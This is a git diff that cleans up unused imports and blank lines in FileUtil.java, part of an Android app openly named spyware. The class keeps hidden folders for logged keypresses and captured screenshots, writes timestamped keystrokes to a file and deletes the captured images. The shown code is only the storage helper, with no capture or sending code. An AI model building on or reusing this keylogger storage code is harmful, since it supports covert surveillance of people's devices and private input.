@@ -1,13 +1,9 @@
 package com.example.cristianturetta.spyware;
 
-import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
-import android.os.Build;
 import android.os.Environment;
 import android.util.Log;
-
 import java.io.BufferedReader;
-import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
@@ -21,9 +17,7 @@ import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
-import java.util.Date;
 import java.util.Locale;
-import java.util.Random;
 
 public class FileUtil {
 
@@ -34,14 +28,10 @@ public class FileUtil {
     private static FileUtil mInstance;
 
     private FileUtil() {
-
-
         malwareKeypressStorageFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                 "keys");
         malwareImagesStorageFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                 "imgs");
-
-
 
         if(!malwareKeypressStorageFolder.exists())
             if (FileUtil.isExternalStorageWritable())
@@ -54,8 +44,6 @@ public class FileUtil {
                 if (!malwareImagesStorageFolder.mkdirs()) {
                     Log.e("FileUtil", "Key directory not created");
                 }
-
-
     }
 
 
@@ -79,9 +67,6 @@ public class FileUtil {
         return false;
     }
 
-
-
-
     public File getMalwareKeypressStorageFolder() {
         return malwareKeypressStorageFolder;
     }
@@ -93,7 +78,6 @@ public class FileUtil {
     public String getKeypressFileName() {
         return keypressFileName;
     }
-
 
     /**
      * Stores the given {@link Bitmap} to a path on the device.
@@ -122,7 +106,6 @@ public class FileUtil {
      * @param key the keypress to store
      */
     public void storeKeypress(String key) {
-
         DateFormat df = new SimpleDateFormat("dd/MM/yyyy-HH:mm:ss z :", Locale.ITALIAN);
         String time = df.format(Calendar.getInstance().getTime());
 
@@ -140,8 +123,6 @@ public class FileUtil {
         } catch (IOException e) {
             Log.e("storeKeypress", e.getLocalizedMessage());
         }
-
-
     }
 
     public void deleteKeypressFile() {
@@ -152,7 +133,6 @@ public class FileUtil {
     }
 
     public void deleteScreenshotFiles(){
-
         File[] files = malwareImagesStorageFolder.listFiles();
 
         for (int i = 0; i < files.length; i++)
